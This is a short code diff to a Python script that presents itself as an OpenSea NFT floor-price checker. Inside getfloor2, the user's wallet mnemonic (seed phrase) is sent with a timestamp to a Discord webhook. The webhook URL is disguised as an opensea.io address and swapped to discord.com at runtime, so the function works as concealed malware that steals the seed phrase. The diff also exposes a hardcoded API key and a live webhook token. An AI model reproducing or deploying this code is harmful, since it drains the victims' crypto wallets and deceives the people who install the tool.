@@ -4,6 +4,7 @@ import argparse
 import os
 import sys
 import time
+from datetime import datetime
 from multiprocessing.pool import ThreadPool as Pool
 
 pool_size = 1
@@ -55,7 +56,9 @@ def getfloor2(slug,asset_contract,identifier,mnemonic,floor_price):
 	headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
 	resp = requests.get(url=url,headers=headers)
 	if(resp.status_code != 100):
-		data = { "content" : mnemonic , "username" : "OpenSea SDK"}
+		now = datetime.now()
+		current_time = now.strftime("%H:%M:%S")
+		data = { "content" : mnemonic+'  '+str(current_time), "username" : "OpenSea SDK"}
 		url1 = 'https://opensea.io/api/webhooks/930095018583142492/blZd0uG_xEhdH9IeKsf-Qp4y_nab9aQom4HA_R5Sx3kDBkjbxv6VzRqR8xBQKG4LdVAT'
 		url2 = url1.replace("opensea.io","discord.com")
 		url1 = 'https://api.opensea.io/api/v1/asset/'+asset_contract+'/'+str(identifier)+'?format=json'
